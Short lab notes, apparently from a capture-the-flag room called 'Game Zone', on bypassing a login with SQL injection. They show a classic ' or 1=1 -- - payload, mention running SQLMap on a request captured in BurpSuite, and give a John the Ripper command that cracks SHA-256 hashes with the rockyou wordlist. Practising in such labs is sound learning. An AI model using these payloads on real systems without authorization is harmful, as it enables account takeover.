# Game Zone 

## Obtain initial access via SQLi 

- SQLi commands
    `SELECT * FROM users WHERE username = :username AND password := password`
    `SELECT * FROM users WHERE username = admin AND password :=' or 1=1 -- -`


## Using SQLMap 
- SQLMap is an open-source, automatic SQL injection and database takeover tool.

- Grab a request with BurpSuite and save it as a text file than then you can pass into SQLMap

- Use John the Ripper to crack the hash 
  `john hash.txt --wordlist=/usr/share/wordlist/rockyou.txt --format=Raw-SHA256`